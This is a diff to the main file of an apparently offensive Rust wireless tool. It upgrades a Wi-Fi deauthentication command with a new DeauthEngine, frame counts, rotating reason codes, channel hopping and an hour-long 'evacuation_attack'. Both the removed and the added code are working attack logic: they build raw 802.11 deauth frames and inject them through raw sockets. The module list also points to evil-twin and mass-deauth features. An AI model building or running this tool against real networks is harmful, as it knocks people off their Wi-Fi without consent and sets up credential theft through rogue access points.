@@ -29,6 +29,7 @@ mod pbkdf2_sha1;
 mod offensive;
 pub mod oui_lookup;
 pub mod raw_injector;
+pub mod real_deauth;
 pub mod deauth_ultra;
 pub mod deauth_massive;
 pub mod eviltwin_v1;
@@ -296,6 +297,15 @@ enum Commands {
         /// Target station MAC (broadcast if omitted)
         #[arg(short = 's', long = "station")]
         station: Option<String>,
+        /// Number of frames (0 = run until Ctrl+C)
+        #[arg(short = 'n', long = "count", default_value_t = 0)]
+        count: u32,
+        /// Reason code (0 = rotate through all codes)
+        #[arg(short = 'r', long = "reason", default_value_t = 0)]
+        reason: u8,
+        /// Hop channels across 2.4 and 5 GHz during the run
+        #[arg(long = "hop")]
+        hop: bool,
     },
 
     /// Broadcast fake 802.11 beacon frames
@@ -894,48 +904,43 @@ async fn main() {
                 None     => warn!("Could not determine OS for {}", host),
             }
         }
-        Commands::Deauth { interface, bssid, station } => {
-            let station_mac = station.as_deref().unwrap_or("FF:FF:FF:FF:FF:FF");
-            section!("Deauth: {} → {} (infinite on {}, Ctrl+C to stop)", bssid, station_mac, interface);
+        Commands::Deauth { interface, bssid, station, count, reason, hop } => {
+            let station_mac = station.as_deref().unwrap_or("ff:ff:ff:ff:ff:ff").to_string();
+            let reason = *reason;
+            let want_hop = *hop;
+            let count = *count;
+
+            section!("Deauth {} -> {} on {}", bssid, station_mac, interface);
+
             #[cfg(target_os = "linux")]
-            match raw_injector::RawSocket::open(interface) {
-                Ok(sock) => {
-                    let targeted = station_mac != "FF:FF:FF:FF:FF:FF";
-                    let radiotap: Vec<u8> = vec![0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
-                    let mut seq = 0u16;
-                    let mut sent = 0u64;
-                    while running.load(Ordering::SeqCst) {
-                        for _ in 0..50 {
-                            if !running.load(Ordering::SeqCst) { break; }
-                            if let Some(mut mgmt) = capture_engine::build_deauth_frame(bssid, station_mac, 7) {
-                                mgmt[22] = (seq << 4) as u8;
-                                mgmt[23] = ((seq << 4) >> 8) as u8;
-                                seq = (seq + 1) & 0xFFF;
-                                let mut frame = radiotap.clone();
-                                frame.extend_from_slice(&mgmt);
-                                let _ = sock.send(&frame);
-                                sent += 1;
-                            }
-                            if targeted {
-                                if let Some(mut mgmt) = capture_engine::build_deauth_frame(station_mac, bssid, 7) {
-                                    mgmt[22] = (seq << 4) as u8;
-                                    mgmt[23] = ((seq << 4) >> 8) as u8;
-                                    seq = (seq + 1) & 0xFFF;
-                                    let mut frame = radiotap.clone();
-                                    frame.extend_from_slice(&mgmt);
-                                    let _ = sock.send(&frame);
-                                    sent += 1;
-                                }
-                            }
-                        }
-                        if sent % 500 == 0 {
-                            info_log!("Deauth {}: {} sent", bssid, sent);
-                        }
-                    }
-                    ok!("Deauth complete: {} frames sent → {}", sent, bssid);
+            {
+                use crate::real_deauth::DeauthEngine;
+
+                if crate::raw_injector::RawSocket::open(interface).is_err() {
+                    err!("cannot open raw socket on {} (root/CAP_NET_RAW required)", interface);
+                    return;
                 }
-                Err(e) => err!("Raw socket failed: {}", e),
+
+                let mut engine = DeauthEngine::new(interface);
+                engine.set_packet_rate(300);
+
+                if count == 0 || want_hop {
+                    // Long-running mode: rotate channels + reason codes.
+                    let bssids = vec![bssid.clone()];
+                    let dur = if count == 0 { 3600 } else { 0 };
+                    info_log!("continuous deauth (Ctrl+C to stop)");
+                    let result = engine.evacuation_attack(&bssids, dur);
+                    ok!("Deauth finished: {}", result);
+                } else {
+                    let res = if reason == 0 {
+                        engine.send_deauth(bssid, &station_mac, count)
+                    } else {
+                        engine.send_deauth_reason(bssid, &station_mac, count, reason)
+                    };
+                    ok!("Deauth complete: {}", res);
+                }
             }
+
             #[cfg(not(target_os = "linux"))]
             err!("Deauth requires Linux AF_PACKET sockets");
         }
